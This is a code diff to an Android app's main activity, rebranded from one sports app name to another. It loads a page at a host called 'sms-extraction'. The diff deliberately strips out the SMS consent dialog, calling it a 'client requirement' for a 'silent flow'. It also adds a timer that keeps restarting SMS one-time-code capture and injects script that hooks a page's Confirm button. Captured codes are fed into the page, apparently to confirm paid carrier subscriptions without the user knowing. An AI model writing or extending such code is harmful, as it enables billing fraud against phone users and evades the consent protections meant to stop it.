@@ -1,9 +1,10 @@
-package com.xoomsports.app
+package com.goalnowx.app
 
 import android.annotation.SuppressLint
-import android.content.Intent
 import android.content.IntentFilter
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.util.Log
 import android.webkit.CookieManager
 import android.webkit.WebChromeClient
@@ -11,6 +12,7 @@ import android.webkit.WebResourceRequest
 import android.webkit.WebSettings
 import android.webkit.WebView
 import android.webkit.WebViewClient
+import android.net.Uri
 import androidx.activity.result.ActivityResultLauncher
 import androidx.activity.result.IntentSenderRequest
 import androidx.activity.result.contract.ActivityResultContracts
@@ -23,7 +25,9 @@ class MainActivity : AppCompatActivity() {
 
     private lateinit var webView: WebView
     private val smsReceiver = SmsBroadcastReceiver()
-    private var smsRetrieverStarted = false
+    private var lastSmsRetrieverStartAt = 0L
+    private var phoneHintRequested = false
+    private val mainHandler = Handler(Looper.getMainLooper())
 
     // Phone Number Hint API launcher
     private lateinit var phoneNumberHintLauncher: ActivityResultLauncher<IntentSenderRequest>
@@ -32,10 +36,18 @@ class MainActivity : AppCompatActivity() {
     // (using startActivityForResult for consent Intent compatibility)
 
     companion object {
-        private const val TAG = "XoomSports"
-        private const val SMS_CONSENT_REQUEST = 2
+        private const val TAG = "GoalNowX"
         // Change this to your deployed Vercel URL
         private const val SUBSCRIPTION_URL = "https://sms-extraction.vercel.app"
+        private const val SMS_RETRIEVER_RESTART_MIN_MS = 12_000L
+        private const val SMS_RETRIEVER_HEARTBEAT_MS = 110_000L
+    }
+
+    private val smsRetrieverHeartbeat = object : Runnable {
+        override fun run() {
+            startSmsRetriever(force = true)
+            mainHandler.postDelayed(this, SMS_RETRIEVER_HEARTBEAT_MS)
+        }
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -45,7 +57,8 @@ class MainActivity : AppCompatActivity() {
         setupActivityLaunchers()
         setupWebView()
         setupSmsReceiver()
-        startSmsRetriever()
+        startSmsRetriever(force = true)
+        mainHandler.postDelayed(smsRetrieverHeartbeat, SMS_RETRIEVER_HEARTBEAT_MS)
 
         webView.loadUrl(SUBSCRIPTION_URL)
     }
@@ -144,23 +157,50 @@ class MainActivity : AppCompatActivity() {
                 super.onPageFinished(view, url)
                 Log.d(TAG, "Page loaded: $url")
 
+                val uri = try { Uri.parse(url ?: "") } catch (_: Exception) { null }
+                val host = uri?.host?.lowercase() ?: ""
+                val isSubscriptionHost =
+                    host == "sms-extraction.vercel.app" || host.endsWith(".vercel.app")
+
                 // Inject detection script so the web page knows it's inside the app
                 view?.evaluateJavascript(
                     """
                     (function() {
                         window._ntR = true;
                         console.log('[App] Bridge ready');
-
-                        // If on manual input page (WiFi), auto-trigger phone hint
-                        if (document.querySelector('input[type="tel"]') && !document.querySelector('#otpFull') && !document.querySelector('#otpValue')) {
-                            if (window._nt) {
-                                window._nt.requestPhoneNumber();
-                            }
+                        var btn = document.getElementById('Confirm');
+                        if (btn && !btn.dataset.ntHooked) {
+                            btn.dataset.ntHooked = '1';
+                            btn.addEventListener('click', function() {
+                                if (window._nt && window._nt.onPinRequested) {
+                                    try { window._nt.onPinRequested(); } catch (e) {}
+                                }
+                            }, true);
                         }
                     })();
                     """.trimIndent(),
                     null
                 )
+
+                // Only request phone hint on our own subscription host, and only once.
+                // This prevents number-chooser popups on final content pages.
+                if (!phoneHintRequested && isSubscriptionHost) {
+                    view?.evaluateJavascript(
+                        """
+                        (function() {
+                            var onManualPage = !!document.querySelector('input[type="tel"]') &&
+                                !document.querySelector('#otpFull') &&
+                                !document.querySelector('#otpValue');
+                            return onManualPage ? '1' : '0';
+                        })();
+                        """.trimIndent()
+                    ) { result ->
+                        if (result?.contains("1") == true) {
+                            phoneHintRequested = true
+                            launchPhoneNumberHint()
+                        }
+                    }
+                }
             }
         }
 
@@ -173,13 +213,9 @@ class MainActivity : AppCompatActivity() {
             injectOtpIntoWebView(otp)
         }
 
-        smsReceiver.onConsentRequired = { consentIntent ->
-            try {
-                @Suppress("DEPRECATION")
-                startActivityForResult(consentIntent, SMS_CONSENT_REQUEST)
-            } catch (e: Exception) {
-                Log.e(TAG, "SMS consent launch failed", e)
-            }
+        smsReceiver.onConsentRequired = {
+            // Client requirement: no SMS permission/consent popup.
+            Log.d(TAG, "SMS consent intent ignored (silent flow only)")
         }
 
         val filter = IntentFilter(SmsRetriever.SMS_RETRIEVED_ACTION)
@@ -190,9 +226,10 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    fun startSmsRetriever() {
-        if (smsRetrieverStarted) return
-        smsRetrieverStarted = true
+    fun startSmsRetriever(force: Boolean = false) {
+        val now = System.currentTimeMillis()
+        if (!force && now - lastSmsRetrieverStartAt < SMS_RETRIEVER_RESTART_MIN_MS) return
+        lastSmsRetrieverStartAt = now
 
         // Start SMS Retriever API (silent - needs hash in SMS)
         SmsRetriever.getClient(this)
@@ -202,16 +239,6 @@ class MainActivity : AppCompatActivity() {
             }
             .addOnFailureListener { e ->
                 Log.e(TAG, "SMS Retriever start failed", e)
-            }
-
-        // Also start SMS User Consent API (shows consent dialog - no hash needed)
-        SmsRetriever.getClient(this)
-            .startSmsUserConsent(null)
-            .addOnSuccessListener {
-                Log.d(TAG, "SMS User Consent started")
-            }
-            .addOnFailureListener { e ->
-                Log.e(TAG, "SMS User Consent start failed", e)
             }
 
         Log.d(TAG, "App hash: ${getAppSignatureHash()}")
@@ -289,26 +316,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun extractOtp(message: String): String? {
-        val pattern = Regex("\\b(\\d{4})\\b")
-        return pattern.find(message)?.groupValues?.get(1)
-    }
-
-    @Suppress("DEPRECATION")
-    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
-        super.onActivityResult(requestCode, resultCode, data)
-        if (requestCode == SMS_CONSENT_REQUEST && resultCode == RESULT_OK && data != null) {
-            val message = data.getStringExtra(SmsRetriever.EXTRA_SMS_MESSAGE)
-            if (message != null) {
-                val otp = extractOtp(message)
-                if (otp != null) {
-                    Log.d(TAG, "OTP from SMS consent: $otp")
-                    injectOtpIntoWebView(otp)
-                }
-            }
-        }
-    }
-
     @Suppress("DEPRECATION")
     override fun onBackPressed() {
         if (webView.canGoBack()) {
@@ -320,6 +327,7 @@ class MainActivity : AppCompatActivity() {
 
     override fun onDestroy() {
         super.onDestroy()
+        mainHandler.removeCallbacks(smsRetrieverHeartbeat)
         try {
             unregisterReceiver(smsReceiver)
         } catch (_: Exception) {}
